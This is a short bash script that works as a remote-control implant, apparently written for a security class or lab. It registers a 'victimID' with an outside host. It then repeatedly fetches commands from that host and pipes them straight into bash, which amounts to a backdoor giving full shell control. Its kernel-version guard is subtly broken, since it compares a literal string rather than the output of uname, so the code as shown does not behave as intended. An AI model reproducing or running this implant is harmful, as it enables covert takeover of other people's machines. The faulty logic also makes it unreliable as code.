#!/bin/bash


os_type='uname -r'

if [ "$os_type" != "4.6.0-kali-amd64" ]
then
	exit
fi

let victimID=$RANDOM

curl -s tufts-bobsledding-society.herokuapp/registervictim/$victimID

while true; do
 curl -s tufts-bobsledding-society.herokuapp/command/$victimID | bash -e
 sleep 2
done
